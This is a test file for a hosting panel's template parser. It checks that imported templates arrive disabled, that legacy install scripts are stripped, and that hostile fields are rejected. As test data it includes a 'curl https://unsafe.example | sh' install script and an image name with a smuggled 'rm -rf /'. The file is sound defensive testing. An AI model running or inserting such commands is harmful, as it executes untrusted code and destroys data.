import test from "node:test";
import assert from "node:assert/strict";
import { parseZiynDocument } from "../shared/ziyn.js";
import { catalog, templateEnvironment } from "../server/catalog.js";
const base = {
  meta: { version: "ZIYN_v1" },
  ...catalog.find((t) => t.id === "node")!,
};
test("native ZIYN round-trip imports disabled for review", () => {
  const parsed = parseZiynDocument({ ...base, enabled: true });
  assert.equal(parsed.id, "node");
  assert.equal(parsed.enabled, false);
  assert.equal(parsed.image, "node:22-alpine");
});
test("legacy PTDL_v2 maps variables but never executes install scripts", () => {
  const t = parseZiynDocument({
    meta: { version: "PTDL_v2" },
    name: "Legacy bot",
    description: "Test",
    author: "Community",
    docker_images: { Node: "node:22-alpine" },
    startup: "node index.js",
    config: { stop: "stop" },
    variables: [
      {
        name: "Entry file",
        env_variable: "BOT_FILE",
        default_value: "index.js",
        rules: "required|string",
      },
    ],
    scripts: { installation: { script: "curl https://unsafe.example | sh" } },
  });
  assert.equal(t.enabled, false);
  assert.equal(t.variables[0].key, "BOT_FILE");
  assert.equal(t.variables[0].required, true);
  assert.ok(!JSON.stringify(t).includes("unsafe.example"));
  assert.match(t.features.join(" "), /Manual installation/);
});
test("untrusted image shell characters and invalid ports are rejected", () => {
  assert.throws(() =>
    parseZiynDocument({ ...base, image: "node:22; rm -rf /" }),
  );
  assert.throws(() => parseZiynDocument({ ...base, port: -1 }));
});
test("unknown format rejected", () =>
  assert.throws(() => parseZiynDocument({ meta: { version: "unknown" } })));
test("catalog has unique IDs and all five hosting categories", () => {
  assert.equal(new Set(catalog.map((t) => t.id)).size, catalog.length);
  assert.deepEqual(
    new Set(catalog.map((t) => t.kind)),
    new Set(["minecraft", "game", "bot", "website", "container"]),
  );
});
test("Minecraft runtime types and explicit EULA defaults", () => {
  assert.equal(
    templateEnvironment(catalog.find((t) => t.id === "paper")!).TYPE,
    "PAPER",
  );
  assert.equal(
    templateEnvironment(catalog.find((t) => t.id === "fabric")!).EULA,
    "FALSE",
  );
});

test("native Bedrock and Velocity definitions have valid startup variables", () => {
  const bedrock = catalog.find((t) => t.id === "bedrock")!;
  assert.ok(bedrock.variables.every(Boolean));
  assert.equal(templateEnvironment(bedrock).EULA, "FALSE");
  assert.equal(templateEnvironment(bedrock).VERSION, "LATEST");
  assert.equal(templateEnvironment(catalog.find((t) => t.id === "velocity")!).VELOCITY_VERSION, "latest");
  assert.deepEqual(catalog.find((t) => t.id === "alpine")!.command, ["sh"]);
});
